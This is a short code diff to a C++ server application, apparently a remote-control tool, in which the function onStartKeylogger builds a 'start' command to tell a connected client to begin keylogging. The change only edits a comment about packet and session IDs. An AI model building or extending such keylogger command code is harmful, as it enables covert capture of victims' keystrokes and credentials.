@@ -144,7 +144,7 @@ void ServerApp::onStartKeylogger(const QString& clientId)
 const std::string cmdStart = "start";
 const std::vector<uint8_t> startPayload(cmdStart.begin(), cmdStart.end());
 
-// Use appropriate packetId and sessionId if you track them per client/session
+// Use appropriate packetId and sessionId if you track them per client/session we match what was sent in menu.cpp
 const uint32_t packetId = 1;    // or increment if needed
 const uint32_t sessionId = 0;   // or your actual sessionId
 
